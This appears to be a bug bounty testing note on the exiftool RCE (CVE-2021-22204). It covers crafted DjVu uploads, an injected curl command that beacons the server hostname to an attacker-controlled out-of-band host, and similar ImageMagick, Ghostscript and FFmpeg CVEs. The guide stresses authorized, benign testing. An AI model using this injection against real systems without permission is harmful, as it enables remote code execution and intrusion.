# exiftool RCE (CVE-2021-22204) — Safe Testing Notes (guide §16)

If the target runs **exiftool** on uploaded files (very common in image/avatar/KYC pipelines to strip or read metadata), a crafted **DjVu** file with a malicious annotation achieves **RCE** when exiftool parses it. This is often un-duped because most hunters stop at "the image got processed."

## How to know it's a candidate
- Baseline (guide §4) showed metadata stripping / EXIF handling / "we read your photo's date".
- Error messages or behavior mention exiftool, or the stack is a Perl/Ruby/Node image pipeline.
- `nuclei -tags exiftool` or version banners.

## Test it SAFELY (OOB marker only)
> **Authorized testing only. Keep the embedded command BENIGN — a single OOB callback, never an interactive shell or destructive command.**

1. Generate a CVE-2021-22204 PoC where the injected command is a harmless beacon to **your** collaborator, e.g.:
   ```
   (the DjVu annotation runs:)   curl http://YOUR.oast.fun/exif-rce-$(hostname)
   ```
   Public generators exist (search "CVE-2021-22204 PoC generator"); they build the `.jpg`/`.djvu` for you. Replace any `id`/reverse-shell command with the benign `curl` above.
2. Upload the crafted file through the image feature.
3. **Confirmation = a hit on your collaborator** from the server's IP (and the hostname in the path). That single OOB callback **proves RCE** — stop there.

## Why a callback is enough
A server-side request originating from the upload-processing host, triggered by your crafted metadata, is unambiguous proof of code execution. You do **not** need a shell to report Critical RCE — and you shouldn't deploy one (guide §26).

## Adjacent processor CVEs to try the same way
- **ImageMagick / ImageTragick (CVE-2016-3714)** — crafted MVG/MSL/SVG delegate → OOB/RCE.
- **Ghostscript** (PDF/EPS/PS rendering) — multiple RCE CVEs; triggered on preview/thumbnail.
- **FFmpeg** (HLS/concat playlists) — SSRF / local-file read on video uploads.

Always: identify the processor, use the matching CVE, prove with a **benign OOB**, then report with `../FILE_UPLOAD_REPORT_TEMPLATE.md`.
